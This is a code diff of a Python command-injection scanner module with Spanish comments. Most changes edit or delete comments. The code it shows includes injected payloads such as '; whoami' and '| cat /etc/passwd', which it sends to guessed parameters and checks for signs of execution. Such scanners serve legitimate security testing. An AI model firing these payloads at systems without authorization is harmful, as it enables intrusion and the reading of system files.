@@ -23,7 +23,7 @@ class CommandInjectionScanner(ScannerModule):
     def run(self, target: Target) -> list[Vulnerability]:
         vulns = []
 
-        # 1. Definir los Payloads (Cargas explosivas)
+        # Payloads para provocar ejecución remota
         payloads = [
             ("; whoami", "root"),  # Linux
             ("; whoami", "www-data"),  # Apache
@@ -36,14 +36,11 @@ class CommandInjectionScanner(ScannerModule):
             ("| cat /etc/passwd", "root:x:0:0"),
         ]
 
-        # 2. Identificar dónde atacar
         params_to_test = []
 
-        # A) Si ya nos dan parámetros en el target (POST o GET), los usamos
         if target.params:
             params_to_test = list(target.params.keys())
 
-        # B) Si es GET y están en la URL
         elif "?" in target.url:
             try:
                 query_string = target.url.split("?")[1]
@@ -54,7 +51,7 @@ class CommandInjectionScanner(ScannerModule):
             except:
                 pass
 
-        # C) Si no hay nada, probamos sospechosos (Blind guess)
+        # Si no hay nada, probamos sospechosos comunes
         if not params_to_test:
             params_to_test = ['ip', 'host', 'domain', 'ping', 'addr', 'cmd', 'exec', 'target']
 
@@ -68,7 +65,6 @@ class CommandInjectionScanner(ScannerModule):
 
         for param in params_to_test:
             for payload, expected_string in payloads:
-                # payload ataque: 127.0.0.1; whoami
                 attack_val = f"127.0.0.1{payload}"
 
                 # --- LÓGICA CORREGIDA: PRESERVAR PARÁMETROS ---
@@ -85,10 +81,8 @@ class CommandInjectionScanner(ScannerModule):
 
                 else:  # GET
                     if "?" in target.url and param in target.url:
-                        # Reemplazo en URL
                         attack_url = re.sub(f"{param}=[^&]*", f"{param}={attack_val}", target.url)
                     else:
-                        # Append
                         sep = "&" if "?" in attack_url else "?"
                         attack_url = f"{attack_url}{sep}{param}={attack_val}"
 
@@ -98,7 +92,6 @@ class CommandInjectionScanner(ScannerModule):
                     else:
                         resp = session.get(attack_url, headers=headers, timeout=5, verify=False)
 
-                    # 3. Análisis
                     if expected_string in resp.text:
                         desc = (f"Se detectó Inyección de Comandos (RCE).\n"
                                 f"El servidor ejecutó: '{payload.strip()}'\n"
